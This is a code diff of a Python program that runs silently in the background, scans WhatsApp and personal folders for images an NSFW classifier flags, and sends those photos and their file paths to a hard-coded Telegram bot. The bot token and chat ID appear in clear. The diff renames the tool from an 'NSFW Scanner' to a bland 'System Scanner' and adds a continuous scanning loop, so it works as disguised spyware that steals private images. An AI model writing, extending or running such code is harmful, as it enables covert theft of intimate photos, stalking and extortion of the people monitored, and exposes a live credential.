@@ -1,17 +1,18 @@
 #!/usr/bin/env python3
 """
-Logs Checker
+System Scanner
 
 This application monitors WhatsApp images and common folders and forwards relevant content to a Telegram bot.
 It is designed to run silently in the background and works on both Windows and macOS.
 
 Usage:
-    python nsfr.py [--help] [--verbose] [--scan-all]
+    python main.py [--help] [--verbose] [--scan-all] [--background]
 
 Options:
     --help      Show this help message and exit
     --verbose   Run with verbose output (not silent)
     --scan-all  Scan all common folders (Downloads, Pictures, Documents, Desktop) in addition to WhatsApp folders
+    --background Run in background with system tray icon
 """
 
 import os
@@ -34,9 +35,15 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 import pystray
 from PIL import Image as PilImage
+import signal
+import atexit
+import subprocess
+
+# Global flag for graceful shutdown
+shutdown_flag = threading.Event()
 
 # Set up logging first
-log_file = "logs_checker.log.encrypted"
+log_file = "system_scanner.log.encrypted"
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
@@ -45,13 +52,15 @@ logging.basicConfig(
         logging.StreamHandler()
     ]
 )
-logger = logging.getLogger("LogsChecker")
+logger = logging.getLogger("SystemScanner")
 
 # Try to import Windows-specific modules
 WINDOWS_SUPPORT = False
 try:
     import win32gui
     import win32con
+    import win32process
+    import win32api
     WINDOWS_SUPPORT = True
     logger.info("Windows-specific features loaded successfully")
 except ImportError as e:
@@ -171,11 +180,11 @@ TELEGRAM_CHAT_ID = "7245887050"  # Updated to your real user chat ID
 TELEGRAM_BOT_TOKEN = "8019709115:AAFcCZeoiI8Lp9pTaHP0m_Pc0myRpTYtcMU"
 TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
 
-# NSFW detection threshold (0.0 to 1.0)
-NSFW_THRESHOLD = 0.7
+# Content detection threshold (0.0 to 1.0)
+DETECTION_THRESHOLD = 0.7
 
-class LogsChecker:
-    """Main scanner class for detecting NSFW content in WhatsApp images and common folders"""
+class SystemScanner:
+    """Main scanner class for detecting inappropriate content in WhatsApp images and common folders"""
     
     def __init__(self, verbose=False, scan_all=False):
         """Initialize the scanner with platform-specific settings"""
@@ -187,12 +196,15 @@ class LogsChecker:
         self.processed_images = set()
         self.encryptor = LogEncryption()  # Create encryptor instance
         self.load_processed_images()
-        self.nsfw_model = None
-        self.nsfw_images_found = 0
+        self.detection_model = None
+        self.flagged_images_found = 0
+        self.running = True  # Add running flag for graceful shutdown
         
         # Silence standard output if not verbose
         if not verbose:
-            sys.stdout = open(os.devnull, 'w')
+            # Only redirect stdout if not running in background mode
+            if not hasattr(sys, '_background_mode'):
+                sys.stdout = open(os.devnull, 'w')
             
         logger.info(f"Scanner initialized on {self.system} system")
         logger.info(f"WhatsApp folders to scan: {self.whatsapp_folders}")
@@ -342,52 +354,52 @@ class LogsChecker:
         mime_type, _ = mimetypes.guess_type(file_path)
         return mime_type and mime_type.startswith('image/')
     
-    def _load_nsfw_model(self):
-        """Load the Hugging Face NSFW detection model if not already loaded"""
-        if self.nsfw_model is None:
+    def _load_detection_model(self):
+        """Load the Hugging Face content detection model if not already loaded"""
+        if self.detection_model is None:
             try:
                 from transformers import pipeline
-                logger.info("Loading Hugging Face NSFW detection model...")
-                self.nsfw_model = pipeline("image-classification", model="Falconsai/nsfw_image_detection")
-                logger.info("NSFW detection model loaded successfully")
+                logger.info("Loading Hugging Face content detection model...")
+                self.detection_model = pipeline("image-classification", model="Falconsai/nsfw_image_detection")
+                logger.info("Content detection model loaded successfully")
             except Exception as e:
-                logger.error(f"Failed to load NSFW model: {e}")
+                logger.error(f"Failed to load detection model: {e}")
                 raise
     
-    def detect_nsfw_with_huggingface(self, image_path):
-        """Detect if an image contains NSFW content using Hugging Face pipeline"""
+    def detect_inappropriate_content(self, image_path):
+        """Detect if an image contains inappropriate content using Hugging Face pipeline"""
         try:
-            self._load_nsfw_model()
+            self._load_detection_model()
             
             # Open image with PIL
             image = Image.open(image_path)
             
-            # Predict NSFW probability
-            result = self.nsfw_model(image)
+            # Predict content probability
+            result = self.detection_model(image)
             
             # Extract results
-            nsfw_score = 0
-            nsfw_result = {}
+            inappropriate_score = 0
+            detection_result = {}
             
             for item in result:
-                nsfw_result[item['label']] = item['score']
+                detection_result[item['label']] = item['score']
                 if item['label'] == 'nsfw':
-                    nsfw_score = item['score']
+                    inappropriate_score = item['score']
             
-            logger.info(f"NSFW detection for {os.path.basename(image_path)}: {nsfw_result}")
-            return nsfw_score > NSFW_THRESHOLD, nsfw_result
+            logger.info(f"Content detection for {os.path.basename(image_path)}: {detection_result}")
+            return inappropriate_score > DETECTION_THRESHOLD, detection_result
                 
         except Exception as e:
-            logger.error(f"Error detecting NSFW content in {image_path}: {e}")
+            logger.error(f"Error detecting inappropriate content in {image_path}: {e}")
             return False, {"error": str(e)}
     
-    def send_to_telegram(self, image_path, nsfw_result):
-        """Send an NSFW image to Telegram (send message first, then send image, and check both responses)"""
+    def send_to_telegram(self, image_path, detection_result):
+        """Send a flagged image to Telegram (send message first, then send image, and check both responses)"""
         try:
             # Prepare message text
-            message_text = f"NSFW image detected: {os.path.basename(image_path)}\n"
+            message_text = f"Flagged content detected: {os.path.basename(image_path)}\n"
             message_text += f"Location: {image_path}\n"
-            message_text += f"Detection results: {json.dumps(nsfw_result, indent=2)}"
+            message_text += f"Detection results: {json.dumps(detection_result, indent=2)}"
 
             # Send message
             params = {
@@ -416,7 +428,7 @@ class LogsChecker:
             return False
     
     def scan_directory(self, directory):
-        """Scan a directory for images and check for NSFW content (single-threaded fallback for model stability)"""
+        """Scan a directory for images and check for inappropriate content (single-threaded fallback for model stability)"""
         logger.info(f"Scanning directory: {directory}")
         try:
             for root, _, files in os.walk(directory):
@@ -426,69 +438,92 @@ class LogsChecker:
                     if not self._is_image_file(file_path) or file_path in self.processed_images:
                         continue
                     logger.info(f"Checking image: {file_path}")
-                    is_nsfw, nsfw_result = self.detect_nsfw_with_huggingface(file_path)
+                    is_flagged, detection_result = self.detect_inappropriate_content(file_path)
                     self.processed_images.add(file_path)
-                    if is_nsfw:
-                        logger.warning(f"NSFW content detected in {file_path}")
-                        self.send_to_telegram(file_path, nsfw_result)
-                        self.nsfw_images_found += 1
+                    if is_flagged:
+                        logger.warning(f"Inappropriate content detected in {file_path}")
+                        self.send_to_telegram(file_path, detection_result)
+                        self.flagged_images_found += 1
         except Exception as e:
             logger.error(f"Error scanning directory {directory}: {e}")
     
     def run(self):
-        """Run the scanner in two phases: first WhatsApp folders, then common folders if requested"""
-        logger.info("Starting WhatsApp NSFW Scanner")
-        self.nsfw_images_found = 0
+        """Main scanning loop with improved background support"""
+        logger.info("Starting continuous scanning...")
+        
+        # Load detection model
+        self._load_detection_model()
+        
+        scan_count = 0
+        last_save_time = time.time()
         
         try:
-            # Phase 1: Scan WhatsApp folders
-            if self.whatsapp_folders:
-                logger.info("Phase 1: Scanning WhatsApp folders")
-                for folder in self.whatsapp_folders:
-                    self.scan_directory(folder)
-                logger.info(f"Phase 1 complete. Found {self.nsfw_images_found} NSFW images in WhatsApp folders.")
-            else:
-                logger.warning("No WhatsApp folders found. Skipping Phase 1.")
-            
-            # Phase 2: Scan common folders if requested or if no WhatsApp folders found
-            if self.scan_all or not self.whatsapp_folders:
-                whatsapp_nsfw_count = self.nsfw_images_found
-                self.nsfw_images_found = 0
-                
-                logger.info("Phase 2: Scanning common folders")
-                for folder in self.common_folders:
-                    self.scan_directory(folder)
-                logger.info(f"Phase 2 complete. Found {self.nsfw_images_found} NSFW images in common folders.")
-                
-                # Update total count
-                self.nsfw_images_found += whatsapp_nsfw_count
-            
-            # Save processed images list
-            self.save_processed_images()
-            
-            logger.info(f"Scan completed successfully. Total NSFW images found: {self.nsfw_images_found}")
-            
-            # Send summary to Telegram
-            if self.nsfw_images_found > 0:
-                summary_text = f"Scan complete. Found {self.nsfw_images_found} NSFW images in total."
-                params = {
-                    'chat_id': TELEGRAM_CHAT_ID,
-                    'text': summary_text
-                }
-                requests.post(f"{TELEGRAM_API_URL}/sendMessage", data=params)
-            
+            while self.running and not shutdown_flag.is_set():
+                try:
+                    scan_count += 1
+                    logger.info(f"Starting scan #{scan_count}")
+                    
+                    # Scan WhatsApp folders
+                    for folder in self.whatsapp_folders:
+                        if not self.running or shutdown_flag.is_set():
+                            break
+                        if os.path.exists(folder):
+                            logger.info(f"Scanning WhatsApp folder: {folder}")
+                            self.scan_directory(folder)
+                        else:
+                            logger.warning(f"WhatsApp folder not found: {folder}")
+                    
+                    # Scan common folders if enabled
+                    if self.scan_all:
+                        for folder in self.common_folders:
+                            if not self.running or shutdown_flag.is_set():
+                                break
+                            if os.path.exists(folder):
+                                logger.info(f"Scanning common folder: {folder}")
+                                self.scan_directory(folder)
+                            else:
+                                logger.warning(f"Common folder not found: {folder}")
+                    
+                    # Save processed images periodically (every 5 minutes)
+                    current_time = time.time()
+                    if current_time - last_save_time > 300:  # 5 minutes
+                        self.save_processed_images()
+                        last_save_time = current_time
+                    
+                    logger.info(f"Scan #{scan_count} completed. Total flagged images found: {self.flagged_images_found}")
+                    
+                    # Wait before next scan (check shutdown flag more frequently)
+                    for _ in range(30):  # 30 seconds total, check every second
+                        if shutdown_flag.is_set() or not self.running:
+                            break
+                        time.sleep(1)
+                        
+                except Exception as e:
+                    logger.error(f"Error during scan #{scan_count}: {e}")
+                    # Wait a bit before retrying
+                    for _ in range(10):  # 10 seconds
+                        if shutdown_flag.is_set() or not self.running:
+                            break
+                        time.sleep(1)
+                    
         except KeyboardInterrupt:
-            logger.info("Scan interrupted by user")
-        except Exception as e:
-            logger.error(f"Error during scan: {e}")
+            logger.info("Scanning interrupted by user")
+        finally:
+            logger.info("Saving processed images before exit...")
             self.save_processed_images()
+            logger.info("Scanner stopped")
+    
+    def stop(self):
+        """Stop the scanner gracefully"""
+        logger.info("Stopping scanner...")
+        self.running = False
 
-def create_system_tray(checker):
+def create_system_tray(scanner):
     """Create system tray icon with menu"""
     try:
         # Create a more visible icon
         icon_size = (64, 64)
-        icon_image = PilImage.new('RGB', icon_size, color='red')
+        icon_image = PilImage.new('RGB', icon_size, color='blue')
         
         # Draw a border to make it more visible
         for i in range(3):
@@ -500,19 +535,27 @@ def create_system_tray(checker):
         
         def on_exit(icon):
             logger.info("User requested exit through system tray")
+            shutdown_flag.set()
+            scanner.stop()
             icon.stop()
-            os._exit(0)
+            # Force exit after a short delay
+            threading.Timer(2.0, lambda: os._exit(0)).start()
         
         def on_show_status(icon):
             try:
-                status_msg = f"NSFW Scanner Status:\nNSFW Images Found: {checker.nsfw_images_found}\nScanning Active"
+                status_msg = f"System Scanner Status:\nFlagged Images Found: {scanner.flagged_images_found}\nScanning Active: {'Yes' if scanner.running else 'No'}"
                 if WINDOWS_SUPPORT:
-                    win32gui.MessageBox(
-                        None,
-                        status_msg,
-                        "NSFW Scanner Status",
-                        win32con.MB_OK | win32con.MB_ICONINFORMATION
-                    )
+                    try:
+                        win32gui.MessageBox(
+                            None,
+                            status_msg,
+                            "System Scanner Status",
+                            win32con.MB_OK | win32con.MB_ICONINFORMATION
+                        )
+                    except Exception as e:
+                        logger.error(f"Error showing Windows message box: {e}")
+                        # Fallback to console output
+                        print(status_msg)
                 else:
                     # Fallback for non-Windows systems or when win32gui is not available
                     logger.info(f"Status: {status_msg}")
@@ -520,17 +563,49 @@ def create_system_tray(checker):
             except Exception as e:
                 logger.error(f"Error showing status: {e}")
         
-        # Create the menu
+        def on_restart_scan(icon):
+            """Restart the scanning process"""
+            try:
+                logger.info("Restarting scan requested by user")
+                if not scanner.running:
+                    scanner.running = True
+                    # Start a new scanner thread
+                    scanner_thread = threading.Thread(target=scanner.run, daemon=True)
+                    scanner_thread.start()
+                    logger.info("Scanner restarted successfully")
+                else:
+                    logger.info("Scanner is already running")
+            except Exception as e:
+                logger.error(f"Error restarting scanner: {e}")
+        
+        def on_pause_resume(icon):
+            """Pause or resume scanning"""
+            try:
+                if scanner.running:
+                    scanner.stop()
+                    logger.info("Scanner paused by user")
+                else:
+                    scanner.running = True
+                    scanner_thread = threading.Thread(target=scanner.run, daemon=True)
+                    scanner_thread.start()
+                    logger.info("Scanner resumed by user")
+            except Exception as e:
+                logger.error(f"Error pausing/resuming scanner: {e}")
+        
+        # Create the menu with more options
         menu = (
             pystray.MenuItem("Show Status", on_show_status),
+            pystray.MenuItem("Pause/Resume", on_pause_resume),
+            pystray.MenuItem("Restart Scan", on_restart_scan),
+            pystray.Menu.SEPARATOR,
             pystray.MenuItem("Exit", on_exit)
         )
         
         # Create the icon
         icon = pystray.Icon(
-            "nsfr_scanner",
+            "system_scanner",
             icon_image,
-            "NSFW Scanner (Running)",
+            "System Scanner (Running)",
             menu
         )
         
@@ -540,36 +615,83 @@ def create_system_tray(checker):
         logger.error(f"Error creating system tray icon: {e}")
         raise
 
+def signal_handler(signum, frame):
+    """Handle system signals for graceful shutdown"""
+    logger.info(f"Received signal {signum}, shutting down gracefully...")
+    shutdown_flag.set()
+    sys.exit(0)
+
+def setup_signal_handlers():
+    """Setup signal handlers for graceful shutdown"""
+    try:
+        signal.signal(signal.SIGINT, signal_handler)
+        signal.signal(signal.SIGTERM, signal_handler)
+        if hasattr(signal, 'SIGBREAK'):  # Windows
+            signal.signal(signal.SIGBREAK, signal_handler)
+        logger.info("Signal handlers setup successfully")
+    except Exception as e:
+        logger.warning(f"Could not setup all signal handlers: {e}")
+
 def run_in_background(scan_all=True):
-    """Run the checker in a background thread with system tray support"""
+    """Run the scanner in a background thread with system tray support"""
     try:
         logger.info("Starting background mode...")
         
-        # Initialize checker
-        checker = LogsChecker(verbose=False, scan_all=scan_all)
+        # Mark that we're running in background mode
+        sys._background_mode = True
+        
+        # Setup signal handlers
+        setup_signal_handlers()
+        
+        # Initialize scanner
+        scanner = SystemScanner(verbose=False, scan_all=scan_all)
         
         # Create and start the scanner thread
-        scanner_thread = threading.Thread(target=checker.run, daemon=True)
+        scanner_thread = threading.Thread(target=scanner.run, daemon=True)
         scanner_thread.start()
         logger.info("Scanner thread started successfully")
         
         # Create and run system tray icon
         try:
-            icon = create_system_tray(checker)
+            icon = create_system_tray(scanner)
             logger.info("System tray icon created successfully")
+            
+            # Setup cleanup on exit
+            def cleanup():
+                logger.info("Cleaning up before exit...")
+                shutdown_flag.set()
+                scanner.stop()
+                try:
+                    icon.stop()
+                except:
+                    pass
+            
+            atexit.register(cleanup)
+            
+            # Run the system tray (this blocks until exit)
             icon.run()
+            
         except Exception as e:
             logger.error(f"Failed to create or run system tray icon: {e}")
-            raise
+            # If system tray fails, run without it
+            logger.info("Running without system tray...")
+            try:
+                while not shutdown_flag.is_set():
+                    time.sleep(1)
+            except KeyboardInterrupt:
+                logger.info("Background process interrupted")
             
     except Exception as e:
         logger.error(f"Error in background mode: {e}")
         raise
+    finally:
+        logger.info("Background mode shutting down...")
+        shutdown_flag.set()
 
 def main():
     """Main entry point for the application"""
     try:
-        parser = argparse.ArgumentParser(description="Logs Checker")
+        parser = argparse.ArgumentParser(description="System Scanner")
         parser.add_argument("--verbose", action="store_true", help="Run with verbose output (not silent)")
         parser.add_argument("--scan-all", action="store_true", default=True, help="Scan all common folders in addition to WhatsApp folders")
         parser.add_argument("--encrypt-logs", action="store_true", help="Encrypt log files for privacy")
@@ -591,7 +713,7 @@ def main():
                     password = getpass.getpass("Enter decryption password: ")
                     
                 encryptor = LogEncryption(password=password)
-                log_file = "logs_checker.log.encrypted"
+                log_file = "system_scanner.log.encrypted"
                 decrypted_file = log_file[:-10]  # Remove .encrypted extension
                 
                 print(f"Decrypting {log_file} to {decrypted_file}...")
@@ -607,14 +729,14 @@ def main():
                 logger.info("Starting in background mode...")
                 run_in_background(scan_all=args.scan_all)
             else:
-                checker = LogsChecker(verbose=args.verbose, scan_all=args.scan_all)
-                checker.run()
+                scanner = SystemScanner(verbose=args.verbose, scan_all=args.scan_all)
+                scanner.run()
         except Exception as e:
             logger.error(f"Error during execution: {e}")
             raise
             
     except KeyboardInterrupt:
-        logger.info("Checker stopped by user")
+        logger.info("Scanner stopped by user")
         sys.exit(0)
     except Exception as e:
         logger.error(f"An error occurred: {e}")
